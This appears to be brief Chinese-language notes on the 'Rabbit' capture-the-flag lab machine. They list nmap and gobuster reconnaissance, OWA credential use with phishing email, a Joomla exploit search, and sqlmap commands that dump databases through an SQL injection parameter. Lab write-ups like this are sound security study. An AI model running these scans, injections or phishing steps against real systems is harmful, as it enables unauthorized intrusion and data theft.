
# Rabbit

``` 
nmap -sC -sV -oA nmap/rabbit 10.10.10.71
nslookup
> server 10.10.10.71
> rabbit.htb.local
nmap -6 <Address>
gohubster -k -u http://10.10.10.71 -w /usr/share/wordlists/dirbuster/directory.txt -o gobuster.small.443
```
找到/public的目录
``` 
search owa

```
得到owa的账号密码，访问/owa目录，并登录，发送钓鱼邮件  
之后又扫描出/joomla目录，得知joomla的版本3.8.1  
google -> joomla core exploit

* 查看/Complain目录
``` 
searchsploit complain 
```
得到sql注入页面，/view.php?mod=admin&view=repod&id=plans  
``` 
sqlmap -r report.req --technique=U --dbms=mysql --dump
sqlmap -r report.req --technique=U --dbms=mysql --dbs
```

